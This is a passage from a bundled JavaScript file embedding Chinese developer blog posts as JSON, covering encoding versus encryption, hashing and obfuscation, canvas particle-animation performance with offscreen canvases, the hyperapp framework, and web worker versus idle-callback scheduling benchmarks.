id=\\"zong-jie\\">总结</h3>\\n<p>编码用于维持数据能合适的使用，并且可以通过采用对内容进行编码的相同算法来逆转，不需要密钥。</p>\\n<p>加密用于维护数据机密性，并且需要使用密钥（保密）才能获取原数据。</p>\\n<p>散列法用于通过检测数据散列值是否有明显改变，来验证数据内容的完整性。</p>\\n<p>混淆用于防止人们理解某些内容，经常用于混淆代码以防止逆向工程和盗窃产品的功能。</p>\\n<hr>\\n<p><em>注意</em>：</p>\\n<p>有人可能会问，何时使用混淆而不是加密，答案是混淆后的内容能使一个实体（如人类）更难理解，但其他一些东西（如计算机）能轻易解析。\\n而通过加密后的内容，人和计算机都无法在没有密钥的情况下解析内容。</p>\\n","toc":[{"anchor":"bian-ma","level":3,"text":"编码"},{"anchor":"san-lie-fa-ha-xi","level":3,"text":"散列法(哈希)"},{"anchor":"hun-xiao","level":3,"text":"混淆"},{"anchor":"zong-jie","level":3,"text":"总结"}],"relatedTags":null,"created_at":"2018-07-04","timeArr":[2018,6,4,0,0,0,0],"title":"编码-加密-哈希-混淆不同点-文章翻译","uuid":"e3c935001e875147dac6c7b68d6d86f7cfb78754","summary":"<p><a href=\\"https://danielmiessler.com/study/encoding-encryption-hashing-obfuscation/\\">原文阅读</a></p>\\n<p><img src=\\"/article/img/js_obfuscation.png\\" alt=\\"js_obfuscation\\"></p>\\n<p><a href=\\"#%E7%BC%96%E7%A0%81\\">编码</a></p>\\n<p><a href=\\"#%E5%8A%A0%E5%AF%86\\">加密</a></p>\\n<p>[散列...</p>","slug":"bian-ma-jia-mi-ha-xi-hun-xiao-bu-tong-dian-wen-zhang-fan-yi","sha":"e315fbb406b0f3100dfcf4ec5b7ebb7fc1f41a83"}')},576:function(n){n.exports=JSON.parse('{"content":"<p>canvas做大量重复的粒子运动，例如雪花，星光闪烁</p>\\n<p>并不需要针对每一个粒子进行动画，例如</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> i=<span class=\\"hljs-number\\">0</span>;i&lt;particles,length;i++){\\n  <span class=\\"hljs-keyword\\">let</span> p=particles[i]\\n  ctx.beginPath()\\n  ctx.fillStyle=<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\"></span>)</span>{}\\n  ctx.fillRect(p.x, p.y, w, h);\\n}</code></pre></code></pre>\\n<p>只需要针对重复运动做出2-3个画板，将所有的粒子平均填充到画板上，再移动画板便可,</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">// 创建画板</span>\\n<span class=\\"hljs-keyword\\">let</span> panels=[]\\n    <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> i=<span class=\\"hljs-number\\">0</span>;i&lt;num;i++) {\\n    <span class=\\"hljs-keyword\\">let</span> c = <span class=\\"hljs-built_in\\">document</span>.createElement(<span class=\\"hljs-string\\">\'canvas\'</span>);\\n    c.width =canvasW\\n    c.height = canvasH;\\n    panels.push({\\n      <span class=\\"hljs-attr\\">canvas</span>: c,\\n      <span class=\\"hljs-attr\\">ctx</span>: c.getContext(<span class=\\"hljs-string\\">\'2d\'</span>),\\n      <span class=\\"hljs-attr\\">x</span>:<span class=\\"hljs-number\\">0</span>,\\n      <span class=\\"hljs-attr\\">y</span>:<span class=\\"hljs-number\\">0</span>,\\n      <span class=\\"hljs-attr\\">vx</span>:<span class=\\"hljs-number\\">0</span>,\\n      <span class=\\"hljs-attr\\">vy</span>:<span class=\\"hljs-number\\">0</span>\\n    })\\n}\\n<span class=\\"hljs-comment\\">// 填充</span>\\n<span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> i=<span class=\\"hljs-number\\">0</span>;i&lt;particles,length;i++){\\n  <span class=\\"hljs-keyword\\">let</span> p=particles[i]\\n  <span class=\\"hljs-keyword\\">let</span> cur=<span class=\\"hljs-built_in\\">Math</span>.floor(<span class=\\"hljs-built_in\\">Math</span>.random()*(panels.length<span class=\\"hljs-number\\">-0.01</span>))\\n  <span class=\\"hljs-keyword\\">let</span> cctx=panels[cur].ctx\\n  cctx.beginPath()\\n  cctx.fillStyle=<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\"></span>)</span>{}\\n  cctx.fillRect(p.x, p.y, w, h);\\n}\\n\\n<span class=\\"hljs-comment\\">// 画板移动</span>\\n raf(<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">playing</span>(<span class=\\"hljs-params\\"></span>)</span>{\\n    ctx.clearRect(<span class=\\"hljs-number\\">0</span>,<span class=\\"hljs-number\\">0</span>,canvasW,canvasH)\\n    <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> i=<span class=\\"hljs-number\\">0</span>;i&lt;panels.length;i++){\\n      panels[i].vx=(<span class=\\"hljs-number\\">0</span>-panels[i].x)*<span class=\\"hljs-number\\">0.1</span>\\n      panels[i].vy=(<span class=\\"hljs-number\\">0</span>-panels[i].y)*<span class=\\"hljs-number\\">0.1</span>\\n      panels[i].x+=panels[i].vx\\n      panels[i].y+=panels[i].vy\\n      <span class=\\"hljs-keyword\\">if</span>(<span class=\\"hljs-built_in\\">Math</span>.abs(panels[i].y<span class=\\"hljs-number\\">-0</span>)&lt;<span class=\\"hljs-number\\">1</span>)panels[i].y=<span class=\\"hljs-number\\">0</span>\\n      <span class=\\"hljs-keyword\\">if</span>(<span class=\\"hljs-built_in\\">Math</span>.abs(panels[i].x<span class=\\"hljs-number\\">-0</span>)&lt;<span class=\\"hljs-number\\">1</span>)panels[i].x=<span class=\\"hljs-number\\">0</span>\\n      ctx.drawImage(panels[i].canvas,panels[i].x,panels[i].y)\\n    }\\n    raf(playing)\\n  })</code></pre></code></pre>\\n","toc":[],"relatedTags":null,"created_at":"2018-08-20","timeArr":[2018,7,20,0,0,0,0],"title":"canvas处理大量重复运动","uuid":"7d330d0cc2eaff951ab1a45bc216f483c483f6e0","summary":"<p>canvas做大量重复的粒子运动，例如雪花，星光闪烁</p>\\n<p>并不需要针对每一个粒子进行动画，例如</p>\\n<pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> i=<span class=\\"hljs-number\\">0</span>;i&lt;particles,length;i++){\\n  <span class=\\"hljs-keyword\\">let</span> p=particles[i]\\n  ctx.beginPath()\\n  ctx.fillStyle=<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\"></span>)</span>{}\\n  ...</code></pre>","slug":"canvas-chu-li-da-liang-chong-fu-yun-dong","sha":"e43ef69f83c35b3fbffbb984a2b1c56c4c7db591"}')},577:function(n){n.exports=JSON.parse('{"content":"<p>最近遇到的，目的是通过粒子动画渲染图片</p>\\n<p>图片大小为500*300，并且粒子动画细度为1，也就是粒子总量为15万，并且当动画完成后，图片能完整清晰的显示出来</p>\\n<p>最初尝试15万个粒子同时运动，结果标签页直接崩溃了，意料之中...</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code> <span class=\\"hljs-keyword\\">for</span> (<span class=\\"hljs-keyword\\">let</span> py = <span class=\\"hljs-number\\">0</span>; py &lt; targetH; py ++) {\\n    <span class=\\"hljs-keyword\\">for</span> (<span class=\\"hljs-keyword\\">let</span> px = <span class=\\"hljs-number\\">0</span>; px &lt; targetW; px ++) {\\n      <span class=\\"hljs-keyword\\">let</span> rgba4 = (px + py * targetW) * <span class=\\"hljs-number\\">4</span> - <span class=\\"hljs-number\\">1</span>\\n      <span class=\\"hljs-keyword\\">if</span>(rgba4&lt;<span class=\\"hljs-number\\">0</span>)rgba4=<span class=\\"hljs-number\\">3</span>\\n      <span class=\\"hljs-keyword\\">const</span> rgba3=rgba4<span class=\\"hljs-number\\">-1</span>,rgba2=rgba3<span class=\\"hljs-number\\">-1</span>,rgba1=rgba2<span class=\\"hljs-number\\">-1</span>;\\n      <span class=\\"hljs-keyword\\">const</span> opacity = imgData.data[rgba4];\\n      <span class=\\"hljs-keyword\\">if</span> (opacity === <span class=\\"hljs-number\\">255</span>) {\\n        <span class=\\"hljs-keyword\\">const</span> opts={\\n          <span class=\\"hljs-attr\\">cur</span>:[px,py],\\n          <span class=\\"hljs-attr\\">end</span>:[px,py],\\n          <span class=\\"hljs-attr\\">color</span>:[imgData.data[rgba1],imgData.data[rgba2],imgData.data[rgba3],imgData.data[rgba4]],\\n           <span class=\\"hljs-comment\\">/* 省略：一些其他参数 */</span>\\n         }\\n         <span class=\\"hljs-comment\\">/* 省略：对当前时间戳的处理 */</span>\\n         <span class=\\"hljs-comment\\">/* 省略：对动画的处理 */</span>\\n         ctx.fillStyle = <span class=\\"hljs-string\\">`rgba(<span class=\\"hljs-subst\\">${rgba1}</span>, <span class=\\"hljs-subst\\">${rgba2}</span>, <span class=\\"hljs-subst\\">${rgba3}</span>,<span class=\\"hljs-subst\\">${rgba4}</span>`</span>\\n         ctx.fillRect(curX, curY, <span class=\\"hljs-number\\">1</span>, <span class=\\"hljs-number\\">1</span>);\\n      }\\n    }\\n  }</code></pre></code></pre>\\n<hr>\\n<p>后来考虑离屏吧，规定每个离屏承载量为1000(保证fps)，这么一来，75个<code>离屏canvas</code>，开始动画...奔溃了...</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">export</span> <span class=\\"hljs-keyword\\">default</span> <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">createAssignParticles</span>(<span class=\\"hljs-params\\">allParticles</span>)</span>{\\n  <span class=\\"hljs-comment\\">// 定义每个离屏承载量</span>\\n  <span class=\\"hljs-keyword\\">const</span> eachPanelParticles=<span class=\\"hljs-number\\">1000</span>\\n  <span class=\\"hljs-keyword\\">const</span> assignedParticles=[]\\n  <span class=\\"hljs-keyword\\">const</span> panelsSize=<span class=\\"hljs-built_in\\">Math</span>.ceil(allParticles.length/eachPanelParticles)\\n  <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> i=<span class=\\"hljs-number\\">0</span>;i&lt;panelsSize;i++){\\n    <span class=\\"hljs-comment\\">// 创建离屏canvas</span>\\n    <span class=\\"hljs-keyword\\">const</span>  canvas = <span class=\\"hljs-built_in\\">document</span>.createElement(<span class=\\"hljs-string\\">\'canvas\'</span>);\\n    canvas.width=<span class=\\"hljs-built_in\\">window</span>.outerWidth\\n    canvas.height=<span class=\\"hljs-built_in\\">window</span>.outerHeight;\\n    <span class=\\"hljs-keyword\\">const</span> ctx=canvas.getContext(<span class=\\"hljs-string\\">\'2d\'</span>)\\n    <span class=\\"hljs-comment\\">// 后渲染的在上层</span>\\n    ctx.globalCompositeOperation=<span class=\\"hljs-string\\">\'destination-over\'</span>\\n    <span class=\\"hljs-comment\\">// 取消抗锯齿</span>\\n    ctx.imageSmoothingEnabled = <span class=\\"hljs-literal\\">false</span>;\\n    ctx.mozImageSmoothingEnabled = <span class=\\"hljs-literal\\">false</span>;\\n    ctx.webkitImageSmoothingEnabled = <span class=\\"hljs-literal\\">false</span>;\\n    assignedParticles[i]={\\n      <span class=\\"hljs-attr\\">sourceArr</span>:[],\\n      canvas,\\n      ctx,\\n    }\\n  }\\n  <span class=\\"hljs-comment\\">// 乱序将每个粒子平均插入每个离屏canvas</span>\\n  <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> i=<span class=\\"hljs-number\\">0</span>;i&lt;allParticles.length;i++){\\n    <span class=\\"hljs-keyword\\">const</span> putInWhichPanel=<span class=\\"hljs-built_in\\">Math</span>.floor(<span class=\\"hljs-built_in\\">Math</span>.random()*(panelsSize<span class=\\"hljs-number\\">-0.01</span>))\\n    assignedParticles[putInWhichPanel].sourceArr.push(allParticles[i])\\n  }\\n  <span class=\\"hljs-keyword\\">return</span> assignedParticles\\n}\\n\\n<span class=\\"hljs-comment\\">// 执行动画函数内部</span>\\n<span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> i=<span class=\\"hljs-number\\">0</span>;i&lt;assignedParticles.length;i++){\\n  <span class=\\"hljs-keyword\\">let</span> cur=assignedParticles[i].sourceArr\\n  <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> j=<span class=\\"hljs-number\\">0</span>;j&lt;cur.length;j++){\\n     <span class=\\"hljs-comment\\">/* 省略：对当前时间戳的处理 */</span>\\n     <span class=\\"hljs-comment\\">/* 省略：对动画的处理 */</span>\\n     ctx.fillStyle = <span class=\\"hljs-string\\">`rgba(<span class=\\"hljs-subst\\">${rgba1}</span>, <span class=\\"hljs-subst\\">${rgba2}</span>, <span class=\\"hljs-subst\\">${rgba3}</span>,<span class=\\"hljs-subst\\">${rgba4}</span>`</span>\\n     ctx.fillRect(curX, curY, <span class=\\"hljs-number\\">1</span>, <span class=\\"hljs-number\\">1</span>);\\n  }\\n}</code></pre></code></pre>\\n<p>毕竟同时运动的总量还是15万个粒子...</p>\\n<p>既然不能同时运动，那么就分批运动总行了吧</p>\\n<hr>\\n<p>每个<code>离屏canvas</code>执行完毕，递归调用下一个<code>离屏canvas</code>，但这样又出现一个新的问题，</p>\\n<p>如果每个<code>离屏canvas</code>执行后，清除显示用的画布，那么动画只是会出现每一个离屏的动画，上一个离屏动画的结果并未保存。</p>\\n<p>如果不清除显示的画布，那么每个<code>离屏canvas</code>会有轨迹，造成模糊(虽然也挺好看，但不是需要的效果)。</p>\\n<p><img src=\\"/article/img/%E5%B8%A6%E8%BD%A8%E8%BF%B9.png\\" alt=\\"\\"></p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">import</span> raf <span class=\\"hljs-keyword\\">from</span> <span class=\\"hljs-string\\">\'raf\'</span>\\n<span class=\\"hljs-keyword\\">import</span> {spiral,fadeIn,explode} <span class=\\"hljs-keyword\\">from</span> <span class=\\"hljs-string\\">\'./animations-control/core\'</span>\\n<span class=\\"hljs-keyword\\">import</span> stopIfNeed <span class=\\"hljs-keyword\\">from</span> <span class=\\"hljs-string\\">\'./animations-control/stopIfNeed\'</span>\\n<span class=\\"hljs-keyword\\">import</span> lastRenders <span class=\\"hljs-keyword\\">from</span> <span class=\\"hljs-string\\">\'./animations-control/lastRenders\'</span>\\n\\n\\n<span class=\\"hljs-keyword\\">export</span> <span class=\\"hljs-keyword\\">default</span> <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">play</span>(<span class=\\"hljs-params\\">assignedParticles,c_showMotion,ctx_showMotion,options,doneCallBack</span>)</span>{\\n  <span class=\\"hljs-comment\\">/* 省略：获取会用到的参数*/</span>\\n  <span class=\\"hljs-keyword\\">let</span> allParticlesIdx=<span class=\\"hljs-number\\">0</span>\\n  recursionExec(allParticlesIdx)\\n  <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>  <span class=\\"hljs-title\\">recursionExec</span>(<span class=\\"hljs-params\\">allParticlesIdx</span>)</span>{\\n    <span class=\\"hljs-keyword\\">let</span> arrs=assignedParticles[allParticlesIdx].sourceArr\\n    <span class=\\"hljs-keyword\\">let</span> ctx=assignedParticles[allParticlesIdx].ctx\\n    <span class=\\"hljs-keyword\\">let</span> canvas=assignedParticles[allParticlesIdx].canvas\\n    <span class=\\"hljs-keyword\\">let</span> doneNum=<span class=\\"hljs-number\\">0</span>\\n    <span class=\\"hljs-keyword\\">let</span> rafHandle\\n    <span class=\\"hljs-keyword\\">let</span> msPerFrame=<span class=\\"hljs-number\\">1000</span>/<span class=\\"hljs-number\\">60</span>\\n    <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">startIfNeed</span>(<span class=\\"hljs-params\\"></span>)</span>{\\n      rafHandle= raf(<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">playing</span>(<span class=\\"hljs-params\\">timestamp</span>)</span>{\\n       <span class=\\"hljs-comment\\">/* 省略：判断当前离屏canvas是否结束 */</span>\\n\\n       <span class=\\"hljs-comment\\">// 执行当前离屏canvas</span>\\n      ctx.clearRect(<span class=\\"hljs-number\\">0</span>, <span class=\\"hljs-number\\">0</span>, canvasW, canvasH)\\n      ctx.beginPath();\\n      <span class=\\"hljs-keyword\\">for</span> (<span class=\\"hljs-keyword\\">let</span> k = <span class=\\"hljs-number\\">0</span>; k &lt; arrs.length; k++) {\\n        <span class=\\"hljs-keyword\\">let</span> {cur,end} = arrs[k]\\n        <span class=\\"hljs-comment\\">/* 省略：判断当前粒子是否需要停止*/</span>\\n        <span class=\\"hljs-comment\\">/* 省略：对当前时间戳的处理 */</span>\\n        <span class=\\"hljs-comment\\">/* 省略：对动画的处理 */</span>\\n\\n        ctx.fillStyle = <span class=\\"hljs-string\\">`rgba(<span class=\\"hljs-subst\\">${rgba1}</span>, <span class=\\"hljs-subst\\">${rgba2}</span>, <span class=\\"hljs-subst\\">${rgba3}</span>,<span class=\\"hljs-subst\\">${rgba4}</span>`</span>\\n        ctx.fillRect( curX,  curY, <span class=\\"hljs-number\\">1</span>, <span class=\\"hljs-number\\">1</span>);\\n      }\\n      <span class=\\"hljs-comment\\">// 此处ctx_showMotion是显示用的canvas，</span>\\n      <span class=\\"hljs-comment\\">// 如果不使用clearRect，那么会出现轨迹</span>\\n      <span class=\\"hljs-comment\\">// 如果使用clearRect，那么每次执行的动画结果不会被保存</span>\\n      <span class=\\"hljs-comment\\">// ctx_showMotion.clearRect(0,0,canvasW,canvasH)</span>\\n      ctx_showMotion.drawImage(canvas ,<span class=\\"hljs-number\\">0</span>, <span class=\\"hljs-number\\">0</span>,)\\n\\n        raf(playing)\\n      })\\n      ctx_storeStatus.drawImage(c_showMotion,<span class=\\"hljs-number\\">0</span>,<span class=\\"hljs-number\\">0</span>)\\n    }\\n    startIfNeed()\\n  }\\n}</code></pre></code></pre>\\n<hr>\\n<p>最后考虑用2张画布显示，第一个清除并且显示当前<code>离屏canvas</code>，第二个用来保存第一个的结果</p>\\n<pre><code><pre class=\\"hljs\\"><code>      /* 省略：前面参数多了一个ctx_storeStatus，其他一致 */\\n        ctx.fillStyle = `rgba(${rgba1}, ${rgba2}, ${rgba3},${rgba4}`\\n        ctx.fillRect( curX,  curY, 1, 1);\\n      }\\n      // 此处ctx_showMotion是显示用的canvas，\\n      // 如果不使用clearRect，那么会出现轨迹\\n      // 如果使用clearRect，那么每次执行的动画结果不会被保存\\n      // ctx_showMotion.clearRect(0,0,canvasW,canvasH)\\n      ctx_showMotion.drawImage(canvas ,0, 0,)\\n        raf(playing)\\n      })\\n      // 专门用于保存ctx_showMotion处理结果的canvas画布\\n      ctx_storeStatus.drawImage(c_showMotion,0,0)\\n    }\\n    startIfNeed()\\n  }\\n}</code></pre></code></pre><p>最终效果如下：</p>\\n<p><img src=\\"/article/img/spiral.gif\\" alt=\\"\\"></p>\\n<p>可以看到fps平均在45-50之间</p>\\n<hr>\\n<p>总结：</p>\\n<p>充分利用canvas的画布，将对粒子进行<code>fill</code>的动画转换成对<code>离屏canvas</code>进行<code>drawImage</code>的处理</p>\\n","toc":[],"relatedTags":null,"created_at":"2018-08-26","timeArr":[2018,7,26,0,0,0,0],"title":"canvas执行15万粒子的动画","uuid":"7d5b714624c6bcfe8c2c66acd5114f3f547fbb49","summary":"<p>最近遇到的，目的是通过粒子动画渲染图片</p>\\n<p>图片大小为500*300，并且粒子动画细度为1，也就是粒子总量为15万，并且当动画完成后，图片能完整清晰的显示出来</p>\\n<p>最初尝试15万个粒子同时运动，结果标签页直接崩溃了，意料之中...</p>\\n<pre class=\\"hljs\\"><code> <span class=\\"hljs-keyword\\">for</span> (<span class=\\"hljs-keyword\\">let</span> py = <span class=\\"hljs-number\\">0</span>; py &lt; targetH; py ++) ...</code></pre>","slug":"canvas-zhi-xing-15-wan-li-zi-de-dong-hua","sha":"742860bdc0a8dc633fd2c91feb13e60b00f46229"}')},578:function(n){n.exports=JSON.parse('{"content":"<h2 id=\\"hyperapp-kuang-jia\\">hyperapp框架</h2>\\n<p><a href=\\"https://github.com/stonehank/sourcecode-analysis/blob/master/source-code.hyperapp/README.md\\">完整源码说明注释</a></p>\\n<p>一个极小的类react框架，也是通过 Virtual DOM对节点进行对比（通过key），再更新渲染</p>\\n<p>思维导图：</p>\\n<p><img src=\\"/article/img/hyperapp%E5%AF%BC%E5%9B%BE.jpg\\" alt=\\"\\"></p>\\n","toc":[{"anchor":"hyperapp-kuang-jia","level":2,"text":"hyperapp框架"}],"relatedTags":null,"created_at":"2018-07-01","timeArr":[2018,6,1,0,0,0,0],"title":"超简洁1kb框架-hyperapp","uuid":"041e14e2880378f2920fae48877b46694fbfc26d","summary":"<h4>hyperapp框架</h4>\\n<p><a href=\\"https://github.com/stonehank/sourcecode-analysis/blob/master/source-code.hyperapp/README.md\\">完整源码说明注释</a></p>\\n<p>一个极小的类react框架，也是通过 Virtual DOM对节点进行对比（通过...</p>","slug":"chao-jian-jie-1kb-kuang-jia-hyperapp","sha":"ec662a13e128b776e46f1ef9ec3fdaa63e0d7381"}')},579:function(n){n.exports=JSON.parse('{"content":"<h2 id=\\"web-worker-vs-idlerequestcallback-vs-settimeout\\">web worker VS idleRequestCallback VS setTimeout</h2>\\n<p><strong><em>测试平台：FireFox</em></strong>(Chrome嵌套worker会有<a href=\\"https://bugs.chromium.org/p/chromium/issues/detail?id=31666\\">bug</a>)</p>\\n<table>\\n<thead>\\n<tr>\\n<th><em>方法</em></th>\\n<th align=\\"center\\">从0自加至100亿（相同环境）</th>\\n</tr>\\n</thead>\\n<tbody><tr>\\n<td>web worker(10线程)</td>\\n<td align=\\"center\\">7s</td>\\n</tr>\\n<tr>\\n<td>web worker(单线程)</td>\\n<td align=\\"center\\">29s</td>\\n</tr>\\n<tr>\\n<td>idleRequestCallback</td>\\n<td align=\\"center\\">45s</td>\\n</tr>\\n<tr>\\n<td>setTimeout</td>\\n<td align=\\"center\\">61s</td>\\n</tr>\\n</tbody></table>\\n<p><a href=\\"https://github.com/stonehank/handleHugeTask\\">项目地址</a></p>\\n<p>一些注意点：</p>\\n<ol>\\n<li>web worker执行不受主线程执行影响。</li>\\n<li>idle执行收到主线程影响,主线程繁忙会暂停(因为没有空闲帧),setTimeout也会受影响。</li>\\n<li>worker可以嵌套，充分发挥多核cpu的性能（个人的电脑数据，worker能让浏览器进程迅速到90%，idle和setTimeout在35%徘徊，最多40%)。</li>\\n<li>worker任务结束必须手动关闭，否则线程会一直占用资源。</li>\\n<li>idle和setTimeout应该将任务分割成合适的小任务，否则单个任务过大会影响主线程流畅度。</li>\\n</ol>\\n<hr>\\n<h3 id=\\"web-worker-kai-qi-fang-shi\\">web worker开启方式</h3>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">// 开启</span>\\n<span class=\\"hljs-keyword\\">let</span> worker=<span class=\\"hljs-keyword\\">new</span> Worker(<span class=\\"hljs-string\\">\\"workers-run.js\\"</span>)\\n<span class=\\"hljs-comment\\">// 传递数据，对象会序列化然后再传过去</span>\\nworker.postMessage({target,<span class=\\"hljs-attr\\">threadNum</span>:threadNum.value})\\n<span class=\\"hljs-comment\\">// 接受数据</span>\\nworker.onmessage=<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> (<span class=\\"hljs-params\\">e</span>) </span>{\\n    <span class=\\"hljs-keyword\\">if</span>(e.data===<span class=\\"hljs-string\\">\\"done\\"</span>){\\n        workerRunning=<span class=\\"hljs-literal\\">false</span>\\n        <span class=\\"hljs-comment\\">// 结束线程</span>\\n        worker.terminate()\\n    }\\n}</code></pre></code></pre>\\n<p>内部还可以嵌套：</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">// workers-run.js</span>\\n\\n <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> i=<span class=\\"hljs-number\\">0</span>;i&lt;n;i++) {\\n    <span class=\\"hljs-keyword\\">let</span> subWorker\\n    <span class=\\"hljs-comment\\">// 线程下再分n个子线程</span>\\n    subWorker = <span class=\\"hljs-keyword\\">new</span> Worker(<span class=\\"hljs-string\\">\'sub-workers-run.js\'</span>)\\n    subWorker.postMessage(target / n)\\n    subWorker.onmessage = <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> (<span class=\\"hljs-params\\">e</span>) </span>{\\n        <span class=\\"hljs-comment\\">//...</span>\\n    }\\n}</code></pre></code></pre>\\n<hr>\\n<h3 id=\\"idlerequestcallback-kai-qi-fang-shi\\">idleRequestCallback开启方式</h3>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">let</span> idleID = requestIdleCallback(<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">createIdle</span>(<span class=\\"hljs-params\\">deadline</span>) </span>{\\n    <span class=\\"hljs-comment\\">// 当有空闲帧 并且 未完成目标时</span>\\n    <span class=\\"hljs-keyword\\">while</span> (deadline.timeRemaining() &gt; <span class=\\"hljs-number\\">0</span> &amp;&amp; taskSum &lt; target) {\\n      <span class=\\"hljs-comment\\">// 调用执行函数</span>\\n      smallTask(target/<span class=\\"hljs-number\\">3000</span>);\\n    }\\n    <span class=\\"hljs-comment\\">// 如果未能调用createIdle，didTimeout为true</span>\\n    <span class=\\"hljs-keyword\\">if</span> (deadline.didTimeout) {\\n      <span class=\\"hljs-comment\\">// 未能调用createIdle</span>\\n    }\\n    <span class=\\"hljs-keyword\\">if</span> (taskSum &lt; target) {\\n      <span class=\\"hljs-comment\\">// 递归请求</span>\\n      requestIdleCallback(createIdle)\\n    } <span class=\\"hljs-keyword\\">else</span> {\\n      <span class=\\"hljs-comment\\">// 完成！</span>\\n    }\\n    <span class=\\"hljs-comment\\">// 未能调用createIdle的超时时间</span>\\n}, {<span class=\\"hljs-attr\\">timeout</span>: <span class=\\"hljs-number\\">1000</span>})</code></pre></code></pre>\\n<hr>\\n<h3 id=\\"settimeout-de-yun-xing-fang-shi\\">setTimeout的运行方式</h3>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">if</span> (taskSum&lt;target) {\\n  setTimeout( <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\"></span>)</span>{\\n    run( tg-eachTask );\\n  }, <span class=\\"hljs-number\\">0</span> );\\n}</code></pre></code></pre>\\n<p>经常看到使用<code>Promise.resolve().then</code>代替<code>setTimeout(function(){},0)</code>的，那么这里能不能这么写呢：</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-built_in\\">Promise</span>.resolve().then(<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\"></span>)</span>{\\n  run( tg-eachTask );\\n})</code></pre></code></pre>\\n<p>结果是不行的，使用Promise会造成主线程阻塞，原因是Promise会加入到<code>任务队列</code>，而setTimeout会加入到<code>事件循环队列</code></p>\\n<p>一张图理解：</p>\\n<p><img src=\\"/article/img/eventloop%20and%20callbackqueue.png\\" alt=\\"\\"></p>\\n<p>因此，使用Promise就不会去等下一次队列的渲染，结束后放到任务队列末尾继续调用</p>\\n","toc":[{"anchor":"web-worker-vs-idlerequestcallback-vs-settimeout","level":2,"text":"web worker VS idleRequestCallback VS setTimeout"},{"anchor":"web-worker-kai-qi-fang-shi","level":3,"text":"web worker开启方式"},{"anchor":"idlerequestcallback-kai-qi-fang-shi","level":3,"text":"idleRequestCallback开启方式"},{"anchor":"settimeout-de-yun-xing-fang-shi","level":3,"text":"setTimeout的运行方式"}],"relatedTags":null,"created_at":"2018-07-16","timeArr":[2018,6,16,0,0,0,0],"title":"处理额外复杂任务的3种方式","uuid":"54ce9f8dc0d7064cd42d8c9ee6a7138966a00888","summary":"<h4>web worker VS idleRequestCallback VS setTimeout</h4>\\n<p><em><strong>测试平台：FireFox</strong></em>(Chrome嵌套worker会有<a href=\\"https://bugs.chromium.org/p/chromium/issues/detail?id=31666\\">bug</a>)</p>\\n<p>|*方法...</p>","slug":"chu-li-e-wai-fu-za-ren-wu-de-3-zhong-fang-shi","sha":"f28cf454576cd104bf798125e2ecfc91945fc1cf"}')},580:function(n){n.exports=JSON.parse('{"content":"<h4 id=\\"yi-xie-chang-yong-de-chu-shi-hua-shu-zu-wei-index-de-fang-fa-de-xing-neng-bi-jiao\\">一些常用的初始化数组为index的方法的性能比较</h4>\\n<p>注释为执行时间，这就是为什么循环推荐使用for循环了</p>\\n<p>(整段复制到控制台执行)</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">// 一、</span>\\n<span class=\\"hljs-keyword\\">var</span> a=performance.now()\\n<span class=\\"hljs-keyword\\">var</span> arr=[];\\n<span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> i=<span class=\\"hljs-number\\">0</span>;i&lt;<span class=\\"hljs-number\\">10000000</span>;i++){\\n    arr[i]=i;\\n}\\n<span class=\\"hljs-built_in\\">console</span>.log(performance.now()-a)\\n<span class=\\"hljs-comment\\">// 319ms</span>\\n\\n\\n<span class=\\"hljs-comment\\">// 二、</span>\\n<span class=\\"hljs-keyword\\">var</span> a=performance.now()\\n<span class=\\"hljs-keyword\\">var</span> arr=<span class=\\"hljs-built_in\\">Array</span>(<span 